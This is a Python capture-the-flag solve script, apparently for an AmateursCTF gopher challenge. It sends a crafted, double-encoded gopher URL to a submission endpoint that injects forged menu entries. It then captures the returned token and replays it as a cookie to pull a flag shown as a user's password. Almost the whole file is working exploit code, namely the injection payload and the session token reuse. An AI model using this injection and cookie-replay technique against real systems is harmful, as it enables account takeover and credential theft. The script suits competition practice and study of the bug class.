# curl -X POST https://hell.amt.rs/submit -d "url=gopher://amt.rs:31290/1/submit/user%252509%252509error.host%2525091%25250d%25250aiPlease%2520send%252509%252509error.host%2525091%25250d%25250a0Submit%252520here%252509URL:https:%25252f%25252fcps.amt.rs%25252fregister.php%252509error.host%2525091"
import os
import re

resp = os.popen('curl -s -X POST https://hell.amt.rs/submit -d "url=gopher://amt.rs:31290/1/submit/user%252509%252509error.host%2525091%25250d%25250aiPlease%2520send%252509%252509error.host%2525091%25250d%25250a0Submit%252520here%252509URL:https:%25252f%25252fcps.amt.rs%25252fregister.php%252509error.host%2525091"').read()

token = resp.split(' ')[-1].strip()

resp = os.popen(f'curl -s https://cps.amt.rs/ -H "Cookie: token={token}"').read()

# <p>welcome, a802d. your password is amateursCTF{ye5._ h1s_1s_g0pher_h3ll}. <a href="logout.php"
# a-zA-Z0-9_{}.
print(re.findall(r'amateursCTF{[ -z|~]+}', resp)[0].replace(' ', '+'))